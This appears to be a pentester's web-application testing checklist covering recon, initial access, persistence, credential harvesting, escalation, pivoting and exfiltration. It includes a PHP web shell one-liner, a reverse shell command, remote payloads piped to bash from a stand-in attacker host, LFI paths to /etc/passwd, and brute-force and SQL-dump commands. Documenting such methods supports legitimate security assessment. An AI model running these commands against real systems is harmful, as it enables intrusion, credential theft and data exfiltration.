# Index
- [[Methodology]]
	- [[Physical Access Methodology]]
	- [[Linux Methodology]]
	- [[Windows Methodology]]
	- [[Web Application Methodology]]
	- [[Cloud Methodology]]

# External Reconnaissance
- [ ] **OSINT:** Gather emails, domains, IP addresses, and open ports related to the target.
- [ ] **Nmap:** Conduct a comprehensive scan to identify open ports and services.
    - `nmap -n -Pn -A <target_ip> -p- -o <assessment_number>_<system_name>_<date>`
- [ ] **Nessus:** Identify vulnerabilities, misconfigurations, and outdated patches using Nessus.
- [ ] **Shodan/Censys:** Search for exposed services and vulnerabilities related to the web application.
    - `shodan search <target_domain>`
- [ ] **Burp Suite** - Enumerate and test for vulnerabilities (SQLi, XSS, SSRF).
- [ ] **DNS Enumeration:** Perform DNS enumeration to gather subdomains and other DNS-related information.
    - `dig axfr <domain> @<dns_server>`
    - `dnsenum <domain>`
- [ ] **WHOIS Information:** Identify ownership and contact details of the domain.
    - `whois <target_domain>`
- [ ] **Directory and File Enumeration:** Discover hidden directories and files using fuzzing techniques.
    - `gobuster dir -u <target_url> -w <wordlist>`
    - `dirb http://<target_url>`
- [ ] **Subdomain Enumeration:** Enumerate subdomains that may lead to other attack surfaces.
    - `subfinder -d <target_domain>`
    - `amass enum -d <target_domain>`
- [ ] **Web Application Fingerprinting:** Identify web application technologies and frameworks in use (e.g., CMS, languages).
    - `whatweb <target_url>`
    - `wappalyzer`

# Initial Access
- [ ] **Login Bruteforce/Password Spraying:** Attempt login brute force or password spraying against exposed login portals.
    - `hydra -l <username> -P <password_list> <target_domain> http-post-form "/login:username=^USER^&password=^PASS^"`
- [ ] **SQL Injection (SQLi):** Test for SQL injection vulnerabilities in input fields, URLs, and forms.
    - `sqlmap -u "http://<target_domain>/index.php?id=1" --dbs`
- [ ] **Cross-Site Scripting (XSS):** Inject malicious scripts into vulnerable input fields or parameters.
    - Test manually or use tools like `XSSer` or `OWASP ZAP`.
    - Example: `<script>alert('XSS')</script>`
- [ ] **Cross-Site Request Forgery (CSRF):** Test for CSRF vulnerabilities in forms and HTTP methods.
    - Manually or using `Burp Suite`.
- [ ] **Server-Side Request Forgery (SSRF):** Exploit SSRF to force the web server to make requests on your behalf.
    - `http://<target_url>/fetch.php?url=http://internal_server/private_page`
- [ ] **Command Injection:** Test for command injection vulnerabilities through vulnerable input fields or headers.
    - `; id`
    - `curl http://<attack_ip>:<port>/payload | bash`
- [ ] **Remote File Inclusion (RFI) / Local File Inclusion (LFI):** Exploit file inclusion vulnerabilities to access remote or local files.
    - Example: `http://<target_domain>/page.php?file=../../etc/passwd`

# Internal Reconnaissance

## Application Based
- [ ] **Identify Application Frameworks:** Determine the frameworks and languages used by the application (e.g., PHP, ASP.NET, Node.js).
    - `whatweb <target_url>`
    - `wappalyzer`
- [ ] **Enumerate Hidden Content:** Discover hidden content and sensitive files.
    - `dirb <target_url> /path/to/wordlist`
    - `gobuster dir -u <target_url> -w <wordlist>`
- [ ] **Parameter Discovery:** Enumerate GET/POST parameters by fuzzing endpoints to identify hidden parameters.
    - Use tools like `wfuzz`, `Burp Suite`, or `ZAP Proxy`.
    - Example: `wfuzz -c -z file,/path/to/wordlist -d "param=FUZZ" <target_url>`
- [ ] **Session Management Weaknesses:** Test session management, including session fixation and session hijacking.
    - Check session cookies with `Burp Suite` or `OWASP ZAP`.
    - Test with tools like `OWASP ZAP` or manually manipulate session tokens.
- [ ] **Identify Functionality Flaws:** Look for business logic flaws, improper validation, or broken access control.
    - Use automated tools like `Burp Suite` or manually test.

## Network Based
- [ ] **Server Enumeration:** Identify server versions and technologies (e.g., Apache, Nginx).
    - `whatweb <target_url>`
    - `nmap -sV -p80,443 <target_ip>`
- [ ] **SSL/TLS Testing:** Check SSL/TLS certificates and configurations for weaknesses.
    - `sslscan <target_url>`
    - `testssl.sh <target_url>`
- [ ] **WebSocket/HTTP2 Enumeration:** Check for WebSocket and HTTP2 support and test for vulnerabilities.
    - `wscat --connect ws://<target_url>`
    - `nmap --script http2-detect <target_ip>`
- [ ] **API Testing:** Test for vulnerabilities in exposed API endpoints.
    - Tools: `Postman`, `Insomnia`, `Burp Suite`
    - Example: `curl -X GET <api_url>/v1/resources`
- [ ] **WAF/Firewall Detection:** Detect the presence of Web Application Firewalls (WAF) or other firewall technologies.
    - `wafw00f <target_url>`
    - `nmap --script=http-waf-detect <target_url>`

# Persistence
- [ ] **Web Shell Installation:** Install a web shell for persistent access (e.g., `php`, `aspx`, `jsp`).
    - Upload or inject a web shell through vulnerable file upload features.
    - Example: `<?php system($_GET['cmd']); ?>`
- [ ] **Backdoor Implantation:** Plant backdoors in the application source code for persistent access.
    - Example: Add hidden admin accounts in CMS configurations.
- [ ] **Abuse Application Features:** Abuse functionality like password reset mechanisms to create persistence.
    - Use password reset links to change admin credentials.
- [ ] **Database Backdoors:** Insert malicious triggers or stored procedures in databases.
    - `mysql> CREATE TRIGGER <trigger_name> BEFORE INSERT ON <table> FOR EACH ROW BEGIN ...`

# Credential Harvesting
- [ ] **Exposed Credentials:** Search for exposed credentials in application source code, comments, or configuration files.
    - `grep -r "password" /var/www/html`
    - `dirb http://<target_url> /path/to/wordlist`
- [ ] **Brute Force Login:** Perform brute-force attacks against login forms or authentication systems.
    - `hydra -l <username> -P <password_list> <target_url> http-post-form "/login:username=^USER^&password=^PASS^"`
- [ ] **Database Dumping (SQLi):** Use SQL injection vulnerabilities to dump database contents, including credentials.
    - `sqlmap -u "http://<target_domain>/index.php?id=1" --dump`
- [ ] **Session Hijacking:** Steal session cookies through XSS or session fixation attacks to impersonate users.
    - Use `Burp Suite` to intercept and manipulate session cookies.
- [ ] **Token Reuse:** Reuse JWT or session tokens to impersonate users or escalate privileges.

# Privilege Escalation
- [ ] **Horizontal Privilege Escalation:** Exploit vulnerabilities to gain access to other users' accounts.
    - Abuse session management issues or insecure direct object references (IDOR).
- [ ] **Vertical Privilege Escalation:** Gain elevated privileges by exploiting misconfigured access controls.
    - Check for user roles that allow privilege escalation (e.g., admin functionality exposed).
- [ ] **File Upload Vulnerabilities:** Exploit file upload functionality to upload malicious files and execute code.
    - Bypass file extension filters to upload `.php`, `.jsp`, or other executable file types.
- [ ] **Broken Access Control:** Exploit broken access control mechanisms (e.g., URL tampering, IDOR).
    - `http://<target_url>/admin/edit_user.php?id=1`
- [ ] **API Vulnerabilities:** Exploit misconfigured API endpoints for privilege escalation.
    - Test endpoints for improper authorization checks using tools like `Postman` or `Burp Suite`.

# Lateral Movement/Pivoting/Tunneling
- [ ] **Exploiting Admin Interfaces:** Use admin-level access to move laterally within the application or server.
    - Access restricted areas by exploiting admin interfaces.
- [ ] **Database Access:** Use compromised database credentials to pivot and escalate privileges within the database or server.
    - `mysql -h <target_ip> -u <username> -p`
- [ ] **Web Shell Pivoting:** Use installed web shells to execute commands on other internal services or move laterally.
    - `nc <attack_ip> <attack_port> -e /bin/bash`
- [ ] **Command Execution:** Exploit command execution vulnerabilities to gain a foothold on the underlying server.
    - Example: `curl http://<attack_ip>:<port>/payload.sh | bash`

# Data Exfiltration
- [ ] **Database Dumping:** Dump sensitive data from the database through SQL injection or compromised admin credentials.
    - `sqlmap --dump-all`
- [ ] **Sensitive

 Information Disclosure:** Extract sensitive files and configurations from the server (e.g., `.env`, `.htaccess`, or `config.php`).
    - Use tools like `dirb`, `gobuster`, or manual directory traversal attacks.
- [ ] **File Download via RFI/LFI:** Exploit file inclusion vulnerabilities to download sensitive files.
    - Example: `http://<target_url>/file.php?file=../../../../etc/passwd`
- [ ] **Log Exfiltration:** Access and exfiltrate logs that may contain sensitive information.
    - `cat /var/log/apache2/access.log`
- [ ] **Steganography:** Hide exfiltrated data in images or other media files using steganography.
    - `steghide embed -cf <image.jpg> -ef <file.txt>`
